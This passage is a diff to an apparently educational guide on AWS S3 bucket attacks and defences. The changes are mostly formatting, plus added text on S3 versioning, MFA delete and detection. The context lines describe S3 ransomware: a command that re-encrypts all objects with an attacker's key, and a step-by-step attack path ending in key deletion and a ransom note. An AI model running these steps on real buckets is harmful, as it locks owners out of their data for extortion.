 will be able to configure the bucket to “self destruct” its objects. To be able to manage lifecycle configuration on a bucket, a attacker would need to have permission s3:PutLifecycleConfiguration. 
 
@@ -444,7 +536,8 @@ Code shows manipulation with bucket life-cycle rules by setting them to delete o
  ```
 
 
-#### Encrypt / Re-encrypt objects
+**Encrypt / Re-encrypt objects**
+
 Encrypt / Re-encrypt objects with encryption key of attacker. Encryption key can be local or stored in a remote account. In this way, the encryption key is the only way the victim can decrypt the files.
  ```
     aws s3 cp s3://my-bucket/ s3://my-bucket/ --recursive --sse-c AES256 --sse-c-key $encryption_key
@@ -452,12 +545,18 @@ Encrypt / Re-encrypt objects with encryption key of attacker. Encryption key can
 Once a customer key encrypts the object, the victim will receive again the following error when trying to access the encrypted files:
 ![Alt text](/documentation/images/image.png)
  
-#### Attack path for ransomware 
+**Attack path for ransomware**
+
 • Attacker creates a KMS key in their own AWS account and provides “the world” access to use that KMS key for encryption. This means that it could be used by any AWS user/role/account to encrypt, but not decrypt objects in S3.
+
 • Attacker identifies a target S3 bucket and gains write-level access to it. 
+
 • Attacker checks the configuration of the bucket to determine if it is able to be targeted by ransomware. This would include checking if S3 Object Versioning is enabled and if multi-factor authentication delete (MFA delete) is enabled. If Object Versioning is enabled, but MFA delete is disabled, the attacker can just disable the Object Versioning. If both Object Versioning and MFA delete are enabled, it would be required to delete remaining backups first.
+
 • Attacker uses the AWS API to replace each object in a bucket with a new copy of itself, but this time, it can be encrypted with the attackers KMS key.
+
 • Attacker schedules the deletion of the KMS key that was used for this attack.
+
 • Attacker uploads a final file such as “ransom-note.txt” without encryption, which instructs the target on how to get their files back.
 
 The following screenshot shows an example of a file that was targeted for a ransomware attack. As you can see, the account ID that owns the KMS key that was used to encrypt the object is different than the account ID of the account that owns the object.
@@ -477,11 +576,18 @@ The next screenshot shows what happens when the object owner uses a pre-signed U
 - Like in previous attacks, analyzing CloudTrail logs it can be used to identify and respond to data tampering attempts by monitoring S3 data events, analyzing logs for unauthorized object copies and changes.
 
 #### Pre-receive hooks:
-- Create pre-receive hooks in your Git repositories [git hooks](https://githooks.com/) to monitor for commits that may accidentally contain credentials and deny them before a developer pushes their access keys or credentials.
+- Create pre-receive [git hooks](https://githooks.com/) in your Git repositories to monitor for commits that may accidentally contain credentials and deny them before a developer pushes their access keys or credentials.
 #### S3 Object Versioning and MFA Delete:
-- This is perhaps the most important, but potentially very expensive. S3 Object Versioning allows S3 objects to be “versioned”, which means that if a file is modified, then both copies are kept in the bucket as a sort of “history”. S3 Object Versioning is not enough on its own, because an attacker could just disable the versioning and overwrite/delete any existing versions that are in the bucket without the worry of a new version being created. To combat this, AWS offers the feature of multi-factor authentication delete in S3 buckets. Having MFA delete enabled forces MFA to be used to do either of the following two things:
- - Change the versioning state of the specified S3 bucket (i.e. disable versioning)
- - Permanently delete an object version
+- This is perhaps the most important, but potentially very expensive. S3 Object Versioning allows S3 objects to be “versioned”, which means that if a file is modified, then both copies are kept in the bucket as a sort of “history”. This helps to recover the objects from accidental deletes or overwrites. 
+- S3 Object Versioning is not enough on its own, because an attacker could just disable the versioning and overwrite/delete any existing versions that are in the bucket without the worry of a new version being created. To combat this, AWS offers the feature of multi-factor authentication delete in S3 buckets. 
+- When MFA delete is enabled the bucket owner must include two forms of authentication in any request to delete a version or change the versioning state of the bucket. Additionally MFA delete requires additional authentication for either of the following operations:
+   - Change the versioning state of the specified S3 bucket (i.e. disable versioning)
+   - Permanently delete an object version
+- For example if your security credentials are compromised MFA delete can help prevent accidental bucket deletions by requiring the user who initiates the delete action to prove physical possession of an MFA device with an MFA code.
+- The example enables S3 Versioning and multi-factor authentication (MFA) delete on a bucket. (Using the AWS CLI)
+   ```
+      aws s3api put-bucket-versioning --bucket DOC-EXAMPLE-BUCKET1 --versioning-configuration Status=Enabled,MFADelete=Enabled --mfa "SERIAL 123456"	
+   ```
 
 
 
@@ -495,13 +601,12 @@ The next screenshot shows what happens when the object owner uses a pre-signed U
 6. [AWS S3 Bucket Takeover Vulnerability: Risks, Consequences, and Detection](https://socradar.io/aws-s3-bucket-takeover-vulnerability-risks-consequences-and-detection/)
 7. [Data Exfiltration through S3 Server Access Logs](https://hackingthe.cloud/aws/exploitation/s3_server_access_logs/)
 8. [Security best practices for Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
-9. [Data Exfiltration on cloud](https://www.shehackske.com/how-to/data-exfiltration-on-cloud-1606/)
-10. [Security best practices for Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
-11. [List all Files in an S3 Bucket with AWS CLI](https://bobbyhadz.com/blog/aws-cli-list-all-files-in-bucket)
-12. [S3Scanner](https://pypi.org/project/S3Scanner/)
-13. [S3 Ransomware: Attack Vector](https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/)
-14. Misconfigurations Leading to AWS S3 Ransomware Exposure: Hard Facts and Mitigation Techniques 
-15. [Ransomware in the Cloud: Breaking Down The Attack Vectors](https://www.dig.security/post/understand-ransomware-to-protect-your-data-in-the-cloud)
-16. [Subdomain Takeover via Abandoned Amazon S3 Bucket](https://char49.com/articles/subdomain-takeover-via-abandoned-amazon-s3-bucket)
-17. [Sub-Domain Take Over — AWS S3 Bucket](https://towardsaws.com/subdomain-takeover-aws-s3-bucket-4699815d1b62)
-18. [Abusing S3 Bucket Permissions](https://www.yeswehack.com/learn-bug-bounty/abusing-s3-bucket-permissions)
+9. [Security best practices for Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html)
+10. [List all Files in an S3 Bucket with AWS CLI](https://bobbyhadz.com/blog/aws-cli-list-all-files-in-bucket)
+11. [S3Scanner](https://pypi.org/project/S3Scanner/)
+12. [S3 Ransomware: Attack Vector](https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/)
+13. Misconfigurations Leading to AWS S3 Ransomware Exposure: Hard Facts and Mitigation Techniques 
+14. [Ransomware in the Cloud: Breaking Down The Attack Vectors](https://www.dig.security/post/understand-ransomware-to-protect-your-data-in-the-cloud)
+15. [Subdomain Takeover via Abandoned Amazon S3 Bucket](https://char49.com/articles/subdomain-takeover-via-abandoned-amazon-s3-bucket)
+16. [Sub-Domain Take Over — AWS S3 Bucket](https://towardsaws.com/subdomain-takeover-aws-s3-bucket-4699815d1b62)
+17. [Abusing S3 Bucket Permissions](https://www.yeswehack.com/learn-bug-bounty/abusing-s3-bucket-permissions)
